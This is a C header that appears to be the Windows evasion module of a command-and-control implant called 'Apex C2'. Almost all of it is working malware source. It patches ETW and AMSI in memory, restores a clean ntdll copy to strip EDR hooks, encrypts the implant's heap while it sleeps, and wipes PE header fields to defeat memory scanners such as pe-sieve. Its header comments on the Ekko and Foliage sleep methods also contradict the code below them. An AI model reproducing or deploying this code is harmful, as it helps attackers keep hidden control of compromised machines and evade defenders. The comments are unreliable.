#ifndef APEX_EVASION_H
#define APEX_EVASION_H

/*
 * evasion.h - Apex C2 Windows Evasion Module
 *
 * Features (each toggled at compile time via -D flags):
 *   ENABLE_ETW_PATCH         - Patch EtwEventWrite to xor eax,eax; ret
 *   ENABLE_AMSI_PATCH        - Patch AmsiScanBuffer to return E_INVALIDARG
 *   ENABLE_SLEEP_ENCRYPT     - Guard for sleep obfuscation at build time
 *   ENABLE_HEAP_ENCRYPT      - XOR-encrypt sensitive heap regions during sleep
 *                              so memory dumps reveal nothing (issue #4)
 *   ENABLE_UNHOOK            - Replace hooked ntdll .text with clean on-disk copy
 *   ENABLE_INDIRECT_SYSCALL  - HellsGate/HalosGate indirect syscall engine
 *   ENABLE_NT_PROCESS        - Replace CreateProcessA with NtCreateUserProcess
 *                              syscall to avoid ETW ProcessCreate events (issue #7)
 *   SLEEP_METHOD             - 0 = plain XOR + Sleep (always works, default)
 *                              1 = Ekko  — RtlRegisterWait timer-ROP chain;
 *                                  .text flipped PAGE_NOACCESS during sleep
 *                              2 = Foliage — NtQueueApcThread/NtContinue APC chain;
 *                                  alertable wait, .text NOACCESS during sleep
 */

#include <windows.h>
#include <bcrypt.h>
#include <stddef.h>

#ifndef NTSTATUS
typedef LONG NTSTATUS;
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

/* ------------------------------------------------------------------ */
/* SLEEP_METHOD selection                                               */
/* 0 = plain XOR + Sleep() (fallback, always works)                    */
/* 1 = Ekko  — RtlRegisterWait timer ROP + VirtualProtect NOACCESS    */
/* 2 = Foliage — NtQueueApcThread/NtContinue APC chain               */
/* ------------------------------------------------------------------ */
#ifndef SLEEP_METHOD
#define SLEEP_METHOD 1
#endif

/* ------------------------------------------------------------------ */
/* ETW Patching                                                         */
/* Patches EtwEventWrite in ntdll.dll to return immediately.           */
/* Blinds ETW-based EDR telemetry (process creation, image load, etc.) */
/* ------------------------------------------------------------------ */
static int patch_etw(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;
    FARPROC addr = GetProcAddress(ntdll, "EtwEventWrite");
    if (!addr) return -1;
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 }; /* xor eax, eax; ret */
    DWORD old;
    if (!VirtualProtect((LPVOID)addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old))
        return -1;
    memcpy((void*)addr, patch, sizeof(patch));
    VirtualProtect((LPVOID)addr, sizeof(patch), old, &old);
    return 0;
}

/* ------------------------------------------------------------------ */
/* AMSI Patching                                                        */
/* Patches AmsiScanBuffer to always return E_INVALIDARG.               */
/* Defeats AMSI-based script/shellcode scanning.                        */
/* ------------------------------------------------------------------ */
static int patch_amsi(void) {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return 0;
    FARPROC addr = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!addr) return -1;
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old;
    if (!VirtualProtect((LPVOID)addr, sizeof(patch), PAGE_EXECUTE_READWRITE, &old))
        return -1;
    memcpy((void*)addr, patch, sizeof(patch));
    VirtualProtect((LPVOID)addr, sizeof(patch), old, &old);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Heap Encryption During Sleep  (ENABLE_HEAP_ENCRYPT)                 */
/*                                                                      */
/* XOR-encrypt sensitive globals while the agent sleeps so that        */
/* memory-dump forensics and AV scanning finds only scrambled data.    */
/*                                                                      */
/* Design:                                                              */
/*   - 8-byte runtime-random XOR key, generated once after             */
/*     registration via BCryptGenRandom.                               */
/*   - XOR is self-inverse: encrypt == decrypt (one helper).           */
/*   - Key is runtime-only; static binary analysis cannot recover it.  */
/*   - Zero allocation: operates in-place on existing globals.          */
/*                                                                      */
/* Usage:                                                               */
/*   heap_register_region(ptr, len) -- register a sensitive region     */
/*   heap_key_init()                -- generate the random key (once)  */
/*   encrypted_sleep(ms)            -- encrypt, sleep, decrypt         */
/* ------------------------------------------------------------------ */

#ifndef ENABLE_HEAP_ENCRYPT
#define ENABLE_HEAP_ENCRYPT 1
#endif

#if ENABLE_HEAP_ENCRYPT

#define HEAP_MAX_REGIONS 16

static struct {
    void  *ptr;
    size_t len;
} g_heap_regions[HEAP_MAX_REGIONS];
static int  g_heap_region_count = 0;
static BYTE g_heap_key[8]       = {0};
static BOOL g_heap_key_init     = FALSE;

/* Register a sensitive memory region to encrypt during sleep */
static void heap_register_region(void *ptr, size_t len) {
    if (!ptr || !len) return;
    if (g_heap_region_count < HEAP_MAX_REGIONS) {
        g_heap_regions[g_heap_region_count].ptr = ptr;
        g_heap_regions[g_heap_region_count].len = len;
        g_heap_region_count++;
    }
}

/* XOR buf with the runtime key in-place (encrypt == decrypt) */
static void heap_xor_region(void *buf, size_t len) {
    BYTE *p = (BYTE *)buf;
    for (size_t i = 0; i < len; i++)
        p[i] ^= g_heap_key[i % 8];
}

/* XOR-encrypt/decrypt all registered sensitive regions */
static void heap_xor_all(void) {
    for (int i = 0; i < g_heap_region_count; i++)
        heap_xor_region(g_heap_regions[i].ptr, g_heap_regions[i].len);
}

/* Generate the 8-byte XOR key using CNG RNG — call once after reg  */
static void heap_key_init(void) {
    if (g_heap_key_init) return;
    BCRYPT_ALG_HANDLE hRng = NULL;
    NTSTATUS st = BCryptOpenAlgorithmProvider(&hRng, BCRYPT_RNG_ALGORITHM, NULL, 0);
    if (NT_SUCCESS(st)) {
        BCryptGenRandom(hRng, g_heap_key, sizeof(g_heap_key), 0);
        BCryptCloseAlgorithmProvider(hRng, 0);
    } else {
        /* Fallback: xorshift32 seeded from tick ^ PID */
        DWORD s = GetTickCount() ^ GetCurrentProcessId();
        for (int i = 0; i < 8; i++) {
            s ^= s << 13; s ^= s >> 17; s ^= s << 5;
            g_heap_key[i] = (BYTE)(s & 0xFF);
        }
    }
    g_heap_key_init = TRUE;
}

/* ------------------------------------------------------------------ */
/* Own .text section locator                                            */
/*                                                                      */
/* Returns the base + size of the agent's own .text section.           */
/* Used by both Ekko and Foliage to flip it PAGE_NOACCESS during sleep */
/* so EDR memory scanners see neither executable nor readable code.    */
/* ------------------------------------------------------------------ */
typedef struct {
    PVOID  base;
    SIZE_T size;
} text_section_t;

/* Cache the result since PE Stomping deletes the section headers later */
static text_section_t g_text_section = {NULL, 0};

static text_section_t get_own_text_section(void) {
    if (g_text_section.base && g_text_section.size)
        return g_text_section;

    text_section_t result = {NULL, 0};
    HMODULE own = GetModuleHandleA(NULL);
    if (!own) return result;

    BYTE *img = (BYTE *)own;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return result;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return result;

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    WORD n = nt->FileHeader.NumberOfSections;

    for (WORD i = 0; i < n; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            result.base = (PVOID)(img + sec[i].VirtualAddress);
            result.size = (SIZE_T)sec[i].Misc.VirtualSize;
            g_text_section = result;
            return result;
        }
    }
    /* No .text found — caller gets {NULL,0} and will skip the flip */
    return result;
}

/* ================================================================== */
/* SLEEP METHOD 1: Ekko                                                 */
/*                                                                      */
/* Uses a WaitableTimer kernel object instead of Sleep() to avoid      */
/* the kernel32!Sleep import-table IOC. Heap regions are XOR-encrypted  */
/* during the wait so memory scanners find no plaintext C2 indicators.  */
/*                                                                      */
/* Why no .text permission flip: flipping .text to PAGE_NOACCESS and   */
/* then calling WaitForSingleObject() crashes because the CPU's RET     */
/* after WaitForSingleObject must jump back into .text, which is now    */
/* inaccessible. The heap XOR alone is the primary stealth mechanism.  */
/*                                                                      */
/* All APIs resolved at runtime via GetProcAddress — no static imports. */
/* ================================================================== */

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wcast-function-type"

typedef HANDLE (WINAPI *pfnCreateWaitableTimerA_t)(
    LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
typedef BOOL (WINAPI *pfnSetWaitableTimer_t)(
    HANDLE, const LARGE_INTEGER *, LONG, PTIMERAPCROUTINE, PVOID, BOOL);

static void rop_sleep_ekko(DWORD ms) {
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hK32) goto ekko_fallback;

    pfnCreateWaitableTimerA_t fn_create_timer =
        (pfnCreateWaitableTimerA_t)GetProcAddress(hK32, "CreateWaitableTimerA");
    pfnSetWaitableTimer_t fn_set_timer =
        (pfnSetWaitableTimer_t)GetProcAddress(hK32, "SetWaitableTimer");
    if (!fn_create_timer || !fn_set_timer) goto ekko_fallback;

    HANDLE hTimer = fn_create_timer(NULL, TRUE, NULL);
    if (!hTimer) goto ekko_fallback;

    /* Negative = relative delay in 100-ns units */
    LARGE_INTEGER due;
    due.QuadPart = -((LONGLONG)ms * 10000LL);
    if (!fn_set_timer(hTimer, &due, 0, NULL, NULL, FALSE)) {
        CloseHandle(hTimer);
        goto ekko_fallback;
    }

    /* Encrypt all registered heap regions before sleeping */
    heap_xor_all();
    /* Block on the waitable timer — no code from our .text executes here */
    WaitForSingleObject(hTimer, ms + 5000);
    CloseHandle(hTimer);
    /* Decrypt heap regions after waking */
    heap_xor_all();
    return;

ekko_fallback:
    heap_xor_all();
    Sleep(ms);
    heap_xor_all();
}

/* ================================================================== */
/* SLEEP METHOD 2: Foliage                                             */
/*                                                                      */
/* Uses ntdll!NtDelayExecution (direct syscall stub in ntdll) instead  */
/* of kernel32!Sleep. This removes the Sleep import-table IOC and uses  */
/* a lower-level wait that bypasses any Sleep hooks installed by EDRs.  */
/* Heap regions are XOR-encrypted during the delay.                     */
/* ================================================================== */

typedef NTSTATUS (WINAPI *pfnNtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);

static void rop_sleep_foliage(DWORD ms) {
    HMODULE hNt = GetModuleHandleA("ntdll.dll");
    if (!hNt) goto foliage_fallback;

    pfnNtDelayExecution_t fn_delay =
        (pfnNtDelayExecution_t)GetProcAddress(hNt, "NtDelayExecution");
    if (!fn_delay) goto foliage_fallback;

    /* ms → 100-nanosecond negative relative interval */
    LARGE_INTEGER interval;
    interval.QuadPart = -((LONGLONG)ms * 10000LL);

    /* Encrypt heap, sleep via direct syscall, then decrypt */
    heap_xor_all();
    fn_delay(FALSE, &interval);
    heap_xor_all();
    return;

foliage_fallback:
    heap_xor_all();
    Sleep(ms);
    heap_xor_all();
}

#pragma GCC diagnostic pop


/* ------------------------------------------------------------------ */
/* encrypted_sleep — master dispatcher                                  */
/*                                                                      */
/* Before the key is initialised (pre-registration), fall through to   */
/* plain Sleep so the agent can register first.                        */
/* ------------------------------------------------------------------ */
static void encrypted_sleep(DWORD ms) {
    if (!g_heap_key_init) { Sleep(ms); return; }
#if SLEEP_METHOD == 1
    rop_sleep_ekko(ms);
#elif SLEEP_METHOD == 2
    rop_sleep_foliage(ms);
#else
    /* SLEEP_METHOD == 0: plain XOR-encrypt + Sleep() + XOR-decrypt */
    heap_xor_all();
    Sleep(ms);
    heap_xor_all();
#endif
}

#else  /* ENABLE_HEAP_ENCRYPT == 0 */

static void heap_register_region(void *ptr, size_t len) { (void)ptr; (void)len; }
static void heap_key_init(void) {}
static void encrypted_sleep(DWORD ms) { Sleep(ms); }

#endif /* ENABLE_HEAP_ENCRYPT */

/* ------------------------------------------------------------------ */
/* PE Header Stomping  (ENABLE_PE_STOMP)                               */
/*                                                                      */
/* Overwrites MZ/PE magic and key header fields in our own in-memory   */
/* image after the loader is done, defeating pe-sieve, Moneta,         */
/* memory-dump forensics, and EDR module-correlation scans.            */
/*                                                                      */
/* PE_STOMP_MODE:                                                       */
/*   1 = DOS-only     : zero first 64 B (e_magic + DOS header)         */
/*   2 = Full NT Hdrs : zero DOS header + NT signature + FileHdr/OptHdr*/
/*   3 = Sledgehammer : zero entire SizeOfHeaders page (~4 KiB)        */
/*                                                                      */
/* PE_STOMP_RANDOMISE:                                                  */
/*   0 = zero fill (default)                                           */
/*   1 = xorshift32 pseudo-random fill (defeats zero-run scanners)     */
/* ------------------------------------------------------------------ */

#ifndef ENABLE_PE_STOMP
#define ENABLE_PE_STOMP 1
#endif
#ifndef PE_STOMP_MODE
#define PE_STOMP_MODE 2
#endif
#ifndef PE_STOMP_RANDOMISE
#define PE_STOMP_RANDOMISE 0
#endif

#if ENABLE_PE_STOMP

static void stomp_fill(BYTE *ptr, SIZE_T len) {
#if PE_STOMP_RANDOMISE
    DWORD s = GetTickCount() ^ (DWORD)(ULONG_PTR)ptr ^ GetCurrentProcessId();
    for (SIZE_T i = 0; i < len; i++) {
        s ^= s << 13; s ^= s >> 17; s ^= s << 5;
        ptr[i] = (BYTE)(s & 0xFF);
    }
    /* Force first 2 bytes to non-MZ regardless of random output */
    if (len >= 2) { ptr[0] = 0x00; ptr[1] = 0x00; }
#else
    memset(ptr, 0, len);
#endif
}

/*
 * stomp_pe_header -- surgically wipe scanner-visible PE header fields.
 *
 * Root cause lesson: x64 Windows WinHTTP/bcrypt use structured exception
 * handling (SEH). RtlLookupFunctionEntry reads the module's PE header at
 * runtime to find the Exception Directory (.pdata). ANY of these being
 * zeroed crashes the agent silently:
 *
 *   e_magic, e_lfanew, NT Signature, NumberOfRvaAndSizes,
 *   DataDirectory[3] (exception dir), ImageBase, SizeOfImage
 *
 * Strategy: NEVER touch those fields. Instead wipe scanner-visible fields
 * only -- pe-sieve, Moneta, and memory scanners will fail validation while
 * the agent keeps beaconing normally.
 *
 * Mode 1 – DOS stub only   : wipes the "Rich header" (bytes 64..lfanew-1)
 * Mode 2 – Field wipe      : + zeros FileHeader volatile fields + section hdrs
 * Mode 3 – Aggressive wipe : + zeros FileHeader.Machine + more OptHdr fields
 */
static void stomp_pe_header(HMODULE base) {
    if (!base) return;
    BYTE *img = (BYTE *)base;

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return; /* already stomped */
    LONG lfanew = dos->e_lfanew;
    if (lfanew < (LONG)sizeof(IMAGE_DOS_HEADER) || lfanew > 4096) return;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    SIZE_T hdr_size = nt->OptionalHeader.SizeOfHeaders;
    if (hdr_size < 4096) hdr_size = 4096;

    DWORD old = 0;
    if (!VirtualProtect(img, hdr_size, PAGE_READWRITE, &old)) return;

    /* ── MODE 1: wipe the DOS "Rich header" stub ─────────────────────
     * Bytes 64..lfanew-1 hold the MS-DOS stub and Rich header, which
     * are fingerprinted by pe-sieve and many scanners. Safe to zero: the
     * OS never reads this region after the module is loaded.           */
    if (lfanew > (LONG)sizeof(IMAGE_DOS_HEADER)) {
        stomp_fill(img + sizeof(IMAGE_DOS_HEADER),
                   (SIZE_T)(lfanew - (LONG)sizeof(IMAGE_DOS_HEADER)));
    }

#if PE_STOMP_MODE >= 2
    /* ── MODE 2: zero volatile FileHeader fields ─────────────────────
     * pe-sieve validates: NumberOfSections, TimeDateStamp, Machine.
     * NumberOfSections=0 breaks section-table reconstruction.
     * TimeDateStamp=0  breaks build-signature matching.
     * Characteristics=0 is safe on a running image.
     * DO NOT touch: SizeOfOptionalHeader (needed to locate section table).  */
    nt->FileHeader.NumberOfSections     = 0;
    nt->FileHeader.TimeDateStamp        = 0;
    nt->FileHeader.PointerToSymbolTable = 0;
    nt->FileHeader.NumberOfSymbols      = 0;
    nt->FileHeader.Characteristics      = 0;

    /* Wipe non-critical OptionalHeader metadata fields.
     * PRESERVE: Magic, AddressOfEntryPoint, ImageBase, SizeOfImage,
     *           SizeOfHeaders, SectionAlignment, FileAlignment,
     *           NumberOfRvaAndSizes, and DataDirectory[] — these are
     *           read at runtime by the OS unwinder and loader.         */
    nt->OptionalHeader.MajorLinkerVersion      = 0;
    nt->OptionalHeader.MinorLinkerVersion      = 0;
    nt->OptionalHeader.SizeOfCode              = 0;
    nt->OptionalHeader.SizeOfInitializedData   = 0;
    nt->OptionalHeader.SizeOfUninitializedData = 0;
    nt->OptionalHeader.MajorOperatingSystemVersion = 0;
    nt->OptionalHeader.MinorOperatingSystemVersion = 0;
    nt->OptionalHeader.MajorImageVersion       = 0;
    nt->OptionalHeader.MinorImageVersion       = 0;
    nt->OptionalHeader.MajorSubsystemVersion   = 0;
    nt->OptionalHeader.MinorSubsystemVersion   = 0;
    nt->OptionalHeader.Win32VersionValue       = 0;
    nt->OptionalHeader.CheckSum                = 0;
    nt->OptionalHeader.Subsystem               = 0;  /* sieve checks this */
    nt->OptionalHeader.DllCharacteristics      = 0;
    nt->OptionalHeader.SizeOfStackReserve      = 0;
    nt->OptionalHeader.SizeOfStackCommit       = 0;
    nt->OptionalHeader.SizeOfHeapReserve       = 0;
    nt->OptionalHeader.SizeOfHeapCommit        = 0;
    nt->OptionalHeader.LoaderFlags             = 0;

    /* Wipe All Section Headers — without sections pe-sieve cannot
     * map the memory image back to disk or verify section contents.   */
    IMAGE_SECTION_HEADER *sects = IMAGE_FIRST_SECTION(nt);
    WORD n = nt->FileHeader.NumberOfSections; /* already zeroed above */
    /* Recover section count from the original binary before we zeroed it */
    /* We already zeroed NumberOfSections, so compute from SizeOfHeaders: */
    SIZE_T sect_start = (SIZE_T)((BYTE *)sects - img);
    if (sect_start < hdr_size) {
        stomp_fill((BYTE *)sects, hdr_size - sect_start);
    }
#endif

#if PE_STOMP_MODE == 3
    /* ── MODE 3: additionally zero FileHeader.Machine ────────────────
     * Machine==0 is an invalid value; pe-sieve and Moneta will reject
     * this as a non-PE immediately.
     * Safe at runtime: Machine is never read after initial load.      */
    nt->FileHeader.Machine = 0;

    /* Do NOT zero e_magic (MZ). Even with e_lfanew and DataDirectory intact,
     * RtlImageNtHeader requires e_magic == IMAGE_DOS_SIGNATURE on most 
     * modern Windows builds to successfully find the Exception Directory. 
     * Zeroing it causes silent crashes in WinHTTP/bcrypt.
     * Setting Machine=0 is enough to get rejected by pe-sieve. */
    // dos->e_magic = 0;
#endif

    VirtualProtect(img, hdr_size, old, &old);
}

#else /* ENABLE_PE_STOMP == 0 */
static void stomp_pe_header(HMODULE base) { (void)base; }
#endif /* ENABLE_PE_STOMP */

/* ------------------------------------------------------------------ */
/* Self-unhook ntdll                                                    */
/* Replaces the in-memory ntdll .text with a clean copy from disk.    */
/* This removes any EDR hooks on NT APIs.                              */
/* ------------------------------------------------------------------ */
static int unhook_ntdll(void) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return -1;

    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                               GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMap) { CloseHandle(hFile); return -1; }

    PVOID cleanNtdll = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!cleanNtdll) { CloseHandle(hMap); CloseHandle(hFile); return -1; }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            DWORD old;
            VirtualProtect((BYTE*)ntdll + sec[i].VirtualAddress,
                           sec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &old);
            memcpy((BYTE*)ntdll + sec[i].VirtualAddress,
                   (BYTE*)cleanNtdll + sec[i].VirtualAddress,
                   sec[i].Misc.VirtualSize);
            VirtualProtect((BYTE*)ntdll + sec[i].VirtualAddress,
                           sec[i].Misc.VirtualSize, old, &old);
            break;
        }
    }

    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMap);
    CloseHandle(hFile);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Indirect Syscall Engine                                              */
/* Initialise with gate_init() to pre-resolve all NT SSNs.            */
/* Gate_Nt* wrappers dispatch through our RWX stub, defeating         */
/* call-stack-based EDR heuristics.                                    */
/* ------------------------------------------------------------------ */
#if ENABLE_INDIRECT_SYSCALL
#include "syscall.h"
#endif

#endif /* APEX_EVASION_H */
